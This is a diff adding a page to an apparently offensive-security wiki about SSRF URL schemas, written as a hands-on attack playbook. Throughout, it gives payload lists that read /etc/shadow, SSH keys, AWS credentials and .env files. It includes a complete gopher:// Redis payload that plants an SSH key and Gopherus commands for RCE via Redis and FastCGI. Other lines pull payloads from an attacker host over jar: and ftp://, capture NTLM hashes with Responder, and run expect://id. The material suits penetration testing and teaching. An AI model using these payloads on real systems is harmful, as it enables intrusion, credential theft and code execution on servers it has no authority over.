@@ -1,0 +1,279 @@
+---
+title: Schemas
+description: SSRF protocol schemas - http/https, file://, gopher:// for protocol smuggling, ftp://, dict://, and others.
+mitre: [T1190]
+d3fend: [D3-MH, D3-OTF]
+impact: [InternalAccess, FileRead]
+sidebar:
+  order: 2
+  label: Schemas
+---
+import { Aside, Tabs, TabItem } from '@astrojs/starlight/components';
+
+## TL;DR
+
+The schema (`http://`, `file://`, `gopher://`, etc.) determines what protocol the server speaks for you. `http(s)` reaches HTTP services; `file://` reads local files; `gopher://` smuggles raw bytes to any TCP service that tolerates HTTP-shaped garbage at the top of its protocol. Try them in this order:
+
+```
+http://<COLLAB>                    # confirm SSRF
+http://127.0.0.1:80                # localhost reachable
+file:///etc/passwd                 # local file read
+gopher://127.0.0.1:6379/_<PAYLOAD> # Redis/SMTP/Memcached smuggling
+```
+
+Available schemas depend on the URL-parsing library. Python `urllib` supports `http/https/file/ftp`. PHP's `file_get_contents` supports a long list including `phar://` and `expect://`. `curl`-backed code supports `gopher://`. Java URLConnection has `jar://`. Different libraries → different surfaces.
+
+## Schema reference
+
+| Schema | What it does | Notes |
+| --- | --- | --- |
+| `http://`, `https://` | Standard HTTP | First thing to try; works almost everywhere |
+| `file://` | Read local files | Highest-value local primitive - see below |
+| `ftp://` | FTP fetch | Curl/Python/PHP - read remote files via FTP server you control |
+| `gopher://` | Raw TCP send with arbitrary bytes | Best for protocol smuggling; curl-only |
+| `dict://` | DICT protocol | Curl supports it; sometimes reaches Memcached |
+| `ldap://`, `ldaps://` | LDAP queries | Java applications; sometimes leak NTLM hashes from Windows |
+| `jar://` | Java archive resolution | Java/Spring; can fetch remote JARs as a side effect |
+| `php://` | PHP wrapper | PHP-only; `php://filter` for source code with base64 |
+| `phar://` | PHP Archive | PHP-only; deserialization vector |
+| `expect://` | PHP expect extension | RCE if the extension is loaded; rare |
+| `data://` | Inline data | Sometimes bypasses URL filters |
+| `netdoc://` | Java legacy file read | Java-only; alternative to `file://` |
+
+## http(s)://
+
+The boring one, but it's where you start. Confirms SSRF with an OOB callback before you bother trying anything fancier.
+
+```bash
+# Confirm
+?url=http://<COLLAB>
+
+# Localhost
+?url=http://127.0.0.1:80
+?url=http://127.0.0.1:8080
+?url=http://127.0.0.1:5000
+
+# Internal hostnames (often resolve when localhost is filtered)
+?url=http://internal.app.local
+?url=http://api-internal
+?url=http://admin.internal
+```
+
+`http` and `https` behave identically for SSRF purposes - TLS doesn't add or remove attack surface. Use `http` to skip cert validation issues.
+
+## file://
+
+The single most valuable non-HTTP schema. When `file://` works, you have local file disclosure without needing any internal network reachability.
+
+```bash
+?url=file:///etc/passwd
+?url=file:///etc/shadow                          # if app runs as root
+?url=file:///proc/self/environ                  # current process env vars
+?url=file:///proc/self/cmdline                  # process arguments
+?url=file:///var/www/html/.env                  # framework secrets
+?url=file:///root/.aws/credentials              # AWS CLI creds
+?url=file:///root/.ssh/id_rsa                   # SSH keys
+?url=file:///proc/net/tcp                       # listening sockets - internal port discovery
+```
+
+<Aside type="tip">
+`/proc/self/environ` is the best first read on Linux. It reveals environment variables (often containing DB credentials, API keys, JWT secrets) and tells you the working directory of the application, which informs subsequent reads.
+</Aside>
+
+Some libraries require triple-slash (`file:///`), some accept double-slash. Try both:
+
+```bash
+?url=file:///etc/passwd
+?url=file://etc/passwd
+?url=file:/etc/passwd
+?url=file:////etc/passwd        # works around some normalizers
+```
+
+### Reading non-text files
+
+Binary files (`.so`, `.jar`, images) often render as garbled text in the HTTP response. Save the raw response and read offline:
+
+```bash
+curl -s "http://<TARGET>/?url=file:///app/lib/secret.jar" -o secret.jar
+unzip -l secret.jar
+```
+
+## gopher:// - protocol smuggling
+
+The reason SSRF is so dangerous against internal services. Gopher is an obsolete protocol whose URL syntax allows arbitrary bytes after `gopher://host:port/_`. The underscore is consumed; everything after is sent as raw TCP.
+
+This means: if any internal TCP service tolerates HTTP-shaped garbage at the top of its protocol (Redis, Memcached, SMTP, FTP, MySQL with cleartext auth, etc.), you can speak that protocol *through* the SSRF.
+
+### Redis (port 6379)
+
+Default Redis is unauthenticated and bound to `127.0.0.1`. Classic target.
+
+```bash
+# Goal: write an SSH key to /root/.ssh/authorized_keys
+# Build the Redis command sequence:
+#   CONFIG SET dir /root/.ssh/
+#   CONFIG SET dbfilename authorized_keys
+#   SET x "\n\n<your ssh public key>\n\n"
+#   SAVE
+
+# As a gopher URL (URL-encoded twice - once for the gopher payload, once for the SSRF parameter):
+?url=gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a*3%0d%0a%243%0d%0aset%0d%0a%241%0d%0a1%0d%0a%24<LEN>%0d%0a<KEY-PUBKEY-DATA>%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%243%0d%0adir%0d%0a%2411%0d%0a/root/.ssh/%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%2410%0d%0adbfilename%0d%0a%2415%0d%0aauthorized_keys%0d%0a*1%0d%0a%244%0d%0asave%0d%0a%0a
+```
+
+Don't hand-craft these. Use [Gopherus](https://github.com/tarunkant/Gopherus):
+
+```bash
+git clone https://github.com/tarunkant/Gopherus
+cd Gopherus
+python2 gopherus.py --exploit redis
+# Choose RCE method: PHP shell / SSH key / cron job
+# Outputs ready-to-use gopher URL - URL-encode it once more for the SSRF parameter
+```
+
+### Memcached (port 11211)
+
+Similar idea - unauthenticated by default, accepts cleartext commands:
+
+```bash
+python2 gopherus.py --exploit memcached
+# Choose: stats / store key / retrieve / delete
+```
+
+Useful when the internal Memcached caches authenticated session tokens - store a malicious session, then use it from the outside.
+
+### MySQL (port 3306)
+
+Pre-auth MySQL is binary protocol - gopher works but Gopherus generates the binary correctly:
+
+```bash
+python2 gopherus.py --exploit mysql
+# Requires: known MySQL user with no password (rare but exists in dev/staging)
+```
+
+### SMTP (port 25)
+
+Plain SMTP from the internal network - send phishing as `internal-app@<TARGET>`:
+
+```bash
+python2 gopherus.py --exploit smtp
+```
+
+Useful for internal phishing pivots when the application server has SMTP outbound that you don't.
+
+### FastCGI (port 9000)
+
+PHP-FPM listening on TCP 9000 with default config → RCE via FastCGI binary protocol:
+
+```bash
+python2 gopherus.py --exploit fastcgi
+# Requires: known PHP file path on the target
+```
+
+This is one of the highest-impact SSRF chains - common in Docker setups where the LAMP stack is split across containers and PHP-FPM is exposed without auth between containers.
+
+<Aside type="caution">
+Curl is the canonical gopher consumer. Python's `urllib.request` does *not* support gopher - if the SSRF runs through `urllib`, gopher won't work. Test with a benign payload (`gopher://<COLLAB>:80/_GET%20/%20HTTP/1.0%0d%0a%0d%0a`) before building a real exploit.
+</Aside>
+
+## ftp://
+
+Useful for two things: fetching remote files you serve, and reading from internal FTP servers.
+
+```bash
+# Pull from your FTP
+?url=ftp://<ATTACKER>/payload.html
+
+# Hit internal FTP
+?url=ftp://internal-ftp/sensitive/file.txt
+
+# With auth
+?url=ftp://user:pass@internal-ftp/file.txt
+```
+
+Set up a quick FTP server:
+
+```bash
+sudo pip3 install pyftpdlib
+sudo python3 -m pyftpdlib -p 21 -w
+```
+
+## dict://
+
+Defined-words protocol. Curl supports it. Sometimes reaches Memcached (cleartext text protocol):
+
+```bash
+?url=dict://127.0.0.1:11211/stats
+?url=dict://127.0.0.1:6379/info       # Redis sometimes accepts dict-shaped probes
+```
+
+Less powerful than gopher (single command per request, no binary control), but useful for quick probing of text protocols.
+
+## ldap://, ldaps://
+
+Java apps. The interesting case isn't reading LDAP data - it's that Windows-hosted Java apps doing LDAP lookups will issue NTLM authentication, and you can capture the NetNTLM hashes:
+
+```bash
+# Set up Responder or impacket-ntlmrelayx on your host
+sudo responder -I eth0
+
+# Trigger the SSRF
+?url=ldap://<ATTACKER>/
+
+# Captured: NetNTLMv2 hash of the service account
+```
+
+This crosses into Windows post-exploitation territory; covered properly in a future Windows section. For SSRF purposes: an LDAP-capable Java SSRF on a Windows host = hash steal.
+
+## jar:// (Java)
+
+Resolves resources from JAR archives, fetching the JAR over HTTP first:
+
+```bash
+?url=jar:http://<ATTACKER>/payload.jar!/file
+```
+
+Side effect: the server downloads `payload.jar`. If the application's class loader picks it up (uncommon but possible in classpath-relative resolvers), code execution. Also a confirmation channel for Java SSRF when http schemas are filtered.
+
+## php://, phar://, expect:// (PHP)
+
+PHP's wrapper system is the broadest of any language:
+
+```bash
+# Read source code base64-encoded
+?url=php://filter/convert.base64-encode/resource=index.php
+
+# Read source through multiple filters
+?url=php://filter/read=convert.base64-encode/resource=/etc/passwd
+
+# Phar deserialization (requires controlled phar file)
+?url=phar:///tmp/uploaded.phar/payload
+
+# Expect - RCE if extension loaded
+?url=expect://id
+```
+
+`php://filter` for source code is the highest-yield PHP-specific SSRF primitive. The wrappers `convert.base64-encode` solves the "binary content garbled in HTTP response" problem by encoding before transmission.
+
+## data://
+
+Inline data, sometimes bypasses URL allowlists that check for `http`:
+
+```bash
+?url=data:text/plain,Hello                       # plaintext
+?url=data:text/html,<script>fetch('//attacker')</script>   # html
+?url=data:text/plain;base64,SGVsbG8K            # base64-wrapped
+```
+
+PHP supports `data://` natively. Useful when the filter requires a specific schema prefix but doesn't validate further.
+
+## Common failure modes
+
+- **Schema works but fetched content not returned.** SSRF is one-way - the server made the request, the response was discarded. You have blind SSRF; switch to [blind techniques](/codex/web/server-side/ssrf/blind/) for confirmation/exfil.
+- **`file://` blocked but `http://localhost/...` works.** Application uses two different fetchers - one for HTTP, one for arbitrary URLs, with different allowlists. The HTTP-only fetcher might still serve files via a static-file endpoint reachable from localhost.
+- **Gopher fails with curl-style error.** SSRF runs through Python's `urllib` or another library that doesn't support gopher. No way around this - switch to a different schema or escalate via http to an internal service that *does* run curl.
+- **`http://` URLs work but `file://` doesn't, on a Java app.** Java's `URL` class disables `file://` by default in some recent JDKs (security manager). Try `netdoc://` as a Java-specific equivalent.
+- **Schema URL parsed but no request issued.** The library validated the URL syntactically but blocked the actual fetch. Look for schema allowlists in the source code if you have it (Ghostcat, LFI), or use [filter bypass](/codex/web/server-side/ssrf/filter-bypass/) techniques.
+
+## Notes
+
+The schemas that survive filtering are usually the unusual ones - developers blocklist `file://` and forget about `dict://`, `gopher://`, `jar://`. When the obvious schemas fail, work through the list rather than giving up. Library-quirk-driven schema availability is one of the things that makes SSRF feel like a different bug class on every engagement.
